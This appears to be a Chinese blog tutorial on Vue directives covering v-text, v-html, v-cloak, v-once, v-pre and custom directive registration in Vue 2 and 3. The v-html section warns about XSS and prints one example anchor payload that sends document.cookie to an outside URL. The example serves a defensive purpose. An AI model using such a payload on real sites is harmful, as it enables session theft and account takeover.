---
title: Vue指令
categories: Linux
tags: Linux
icon: note
---
# Vue指令

## 内置指令

学过的指令有很多这里总结一下

>v-bind  : 单向绑定解析表达式, 可简写为 :xxx
>
>v-model : 双向数据绑定
>
>v-for   : 遍历数组/对象/字符串
>
>v-on    : 绑定事件监听, 可简写为@
>
>v-if    : 条件渲染（动态控制节点是否存存在）
>
>v-else  : 条件渲染（动态控制节点是否存存在）
>
>v-show  : 条件渲染 (动态控制节点是否展示)

#### v-text

>作用：向其所在的节点中渲染文本内容。 (纯文本渲染)
>
>与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。这里有点不太灵活

```js
<div v-text='变量'></div>    //解析text语句
```

#### v-html

无法解析脚本标签

>1.作用：向指定节点中渲染包含html结构的内容。
>
>2.与插值语法的区别：
>
>(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
>
>(2).v-html可以识别html结构。
>
>3.严重注意：v-html有安全性问题！！！！
>
>(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
>
>(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```js
<div v-html='变量'></div>    //解析html语句
```

##### cookie安全问题

众所周知cookie存储的是用户数据，如果被人拿到cookie存储的数据，那么就可以登录你的账户做一些坏事，所以慎用v-html

```js
<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>点击我有惊喜</a>
```

如果把上面的字符串解析为html标签，那么就会获取到你的cookie干坏事，虽然现在网站一般都有防盗措施，不能拿到完整cookie但是还是慎用

#### v-cloak

>v-cloak指令（没有值）：
>
>1.本质是一个特殊属性，Vue实例创建完毕接管容器后，会删掉v-cloak属性。
>
>2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

假设当需要请求的渲染页面数据很慢或者用户网速很卡的情况下，那么Vue会先把未解析模板渲染到页面上，这样很不美观，且不好看，这里我们想到一个办法，在模板的每个标签上添加相同类名或者属性来用属性选择器选中，然后使用css的display属性隐藏，以便达到模板不渲染到页面的目的，那么Vue就提供了这么一个统一值v-cloak

```js
[v-cloak]{
            display:none;
        }

<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
```

因为上述代码是先写的模板再引入的Vue文件，所以页面会先把模板渲染进页面，再解析Vue配置文件，Vue再接管模板标签，然后解析为虚拟DOM渲染到页面上，使用属性选择器选中隐藏，等渲染到页面后v-cloak指令会消失，完美的解决了这个问题。

#### v-once

>1.v-once所在节点在初次动态渲染后，就视为静态内容了。
>
>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```js
<div id="mian">
    <h2 v-once>初始化n的值为:{{ n }}</h2>
    <h2>当前的n值为:{{ n }}</h2>
    <button @click="n++">带我n+1</button>
</div>
new Vue({
        el:"#mian",
        data:{
           n:1
        }
    })
```

上面代码两个h2标签，当点击时n++，设置有v-once指令的标签内部的数据不会重新渲染，另一个会通过数据重新解析模板变为2

#### v-pre指令

>1.跳过其所在节点的编译过程。
>
>2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。*

意思很简单，把模板里不用Vue接管标签添加这个指令，那么Vue解析时会直接掠过

## 自定义指令

>备注：
>
>1.指令定义时不加v-，但使用时要加v-；
>
>2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

### 生命周期钩子

#### Vue2生命周期钩子

>bind：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。
>
>inserted：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。
>
>update：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。
>
>
>
>componentUpdated：指令所在组件的 VNode **及其子 VNode** 全部更新后调用。
>
>unbind：只调用一次，指令与元素解绑时调用。

#### Vue2钩子函数参数

>el：指令所绑定的元素，可以用来直接操作 DOM。
>
>binding：一个对象，包含以下 property：
>
>- name：指令名(写入时不包括 v- 前缀)
>- value：指令的绑定值，例如：v-my="1 + 1" 中，绑定值为 2。
>- 其他不太重要可以看文档

#### Vue3生命周期钩子

```js
const myDirective = {
  // 在绑定元素的 attribute 前
  // 或事件监听器应用前调用
  created(el, binding, vnode, prevVnode) {
    // 下面会介绍各个参数的细节
  },
  // 在元素被插入到 DOM 前调用
  beforeMount(el, binding, vnode, prevVnode) {},
  // 在绑定元素的父组件
  // 及他自己的所有子节点都挂载完成后调用
  mounted(el, binding, vnode, prevVnode) {},
  // 绑定元素的父组件更新前调用
  beforeUpdate(el, binding, vnode, prevVnode) {},
  // 在绑定元素的父组件
  // 及他自己的所有子节点都更新后调用
  updated(el, binding, vnode, prevVnode) {},
  // 绑定元素的父组件卸载前调用
  beforeUnmount(el, binding, vnode, prevVnode) {},
  // 绑定元素的父组件卸载后调用
  unmounted(el, binding, vnode, prevVnode) {}
}
```

#### Vue3钩子函数参数

>el：指令所绑定的元素，可以用来直接操作 DOM。
>
>binding：一个对象，包含以下 property：
>
>- name：指令名-写入时不包括 v- 前缀(Vue2的语法，但是Vue3兼容Vue2写法)
>- value：指令的绑定值，例如：v-my="1 + 1" 中，绑定值为 2。
>
>vnode：代表绑定元素的底层 VNode(虚拟dom)
>
>prevNode：之前的渲染中代表指令所绑定元素的 VNode。仅在 beforeUpdate和updated钩子中可用。

### 局部注册指令

new Vue({directives:{指令名:配置对象}})

```js
new Vue({
    el: '.mian',
    directives: {
        big: {
            // bind：指令与元素成功绑定时调用。
            bind(el, binding) {
            },
            // inserted：指令所在元素被插入页面时调用。
            inserted(el, binding) {
            },
            // update：指令所在模板结构被重新解析时调用。
            update(el, binding) {
            }
        },
    }
})
```

### 全局注册指令

Vue.directive(指令名,配置对象) 

```js
Vue.directive('big',{
            // bind：指令与元素成功绑定时调用。
            bind(el, binding) {
            },
            // inserted：指令所在元素被插入页面时调用。
            inserted(el, binding) {
            },
            // update：指令所在模板结构被重新解析时调用。
            update(el, binding) {
            }
  })
```

### 注册指令简写

当你不需要指令所在元素被插入页面时操作元素时，可以使用简写形式，也就是函数

简写形式会自动调用指令绑定时和数据更新时函数

```js
new Vue({
    el: '.mian',
    directives: {
        big(el, binding){
        
       }
    }
})
```